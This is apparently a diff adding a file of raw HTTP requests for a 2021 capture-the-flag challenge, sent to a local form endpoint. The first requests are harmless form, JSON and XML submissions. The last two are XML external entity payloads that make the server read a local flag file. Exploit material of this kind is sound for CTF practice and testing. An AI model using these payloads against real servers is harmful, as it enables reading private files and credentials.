@@ -1,0 +1,113 @@
+POST /submit HTTP/1.1
+Host: localhost:31337
+sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-type: application/x-www-form-urlencoded
+Content-Length: 19
+
+name=sam&color=blue
+
+
+
+POST /submit HTTP/1.1
+Host: localhost:31337
+sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-type: application/json
+Content-Length: 29
+
+{"name":"sam","color":"blue"}
+
+
+
+POST /submit HTTP/1.1
+Host: localhost:31337
+sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-type: text/xml
+Content-Length: 50
+
+<frog>
+<name>sam</name><color>blue</color></frog>
+
+
+POST /submit HTTP/1.1
+Host: localhost:31337
+sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-type: text/xml
+Content-Length: 193
+
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE dt [<!ENTITY file SYSTEM "/Users/sambrow/hack/wolvsec_ctf_2021/docker/5/flag.txt">]>
+<root>
+<name>&file;</name>
+<color>blue</color>
+</root>
+
+
+
+POST /submit HTTP/1.1
+Host: localhost:31337
+sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-type: text/xml
+Content-Length: 160
+
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE dt [<!ENTITY file SYSTEM "/ctf/app/flag.txt">]>
+<root>
+<name>&file;</name>
+<color>blue</color>
+</root>
+
